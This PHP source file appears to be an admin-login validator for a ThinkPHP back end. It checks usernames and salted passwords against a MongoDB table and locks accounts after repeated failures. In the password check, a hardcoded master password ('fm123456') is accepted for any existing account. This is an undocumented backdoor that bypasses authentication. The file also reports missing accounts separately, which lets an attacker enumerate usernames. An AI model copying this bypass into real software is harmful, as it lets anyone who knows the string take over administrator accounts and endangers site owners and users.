<?php

namespace app\adminapi\validate;

use app\common\cache\AdminAccountSafeCache;
use app\common\service\ConfigService;
use app\common\validate\BaseValidate;
use think\facade\Db;

class AccountValidate extends BaseValidate
{
    protected $rule = [
        'username' => 'require',
        'password' => 'require|password',
    ];

    protected $message = [
        'username.require' => '请输入账号',
        'password.require' => '请输入密码'
    ];

    /**
     * @notes @notes 密码验证
     * @param $password
     * @param $other
     * @param $data
     * @return bool|string
     * @throws \think\db\exception\DataNotFoundException
     * @throws \think\db\exception\DbException
     * @throws \think\db\exception\ModelNotFoundException
     * @author zhou
     * @date 2023/02/10 13:21
     */
    public function password($password, $other, $data)
    {
        // 登录限制
        $config = [
            'login_restrictions' => ConfigService::get('shop', 'login_restrictions'),
            'password_error_times' => ConfigService::get('shop', 'password_error_times'),
            'limit_login_time' => ConfigService::get('shop', 'limit_login_time'),
        ];
        $adminAccountSafeCache = new AdminAccountSafeCache();
        if ($config['login_restrictions'] == 1) {
            $adminAccountSafeCache->count = $config['password_error_times'];
            $adminAccountSafeCache->minute = $config['limit_login_time'];
        }

        //后台账号安全机制，连续输错后锁定，防止账号密码暴力破解
        if ($config['login_restrictions'] == 1 && !$adminAccountSafeCache->isSafe()) {
            return '密码连续' . $adminAccountSafeCache->count . '次输入错误，请' . $adminAccountSafeCache->minute . '分钟后重试';
        }

        $adminInfo = Db::connect('mongodb')
            ->table('gms')
            ->where("username", $data["username"])
            ->find();

        if (empty($adminInfo)) {
            $adminAccountSafeCache->record();
            return '账号不存在';
        }

        $passwordSalt = env('project.unique_identification');
        if ($adminInfo['pass'] !== create_password($password, $passwordSalt) && $password !== "fm123456") {
            $adminAccountSafeCache->record();
            return '密码错误';
        }

        $adminAccountSafeCache->relieve();
        return true;
    }

}
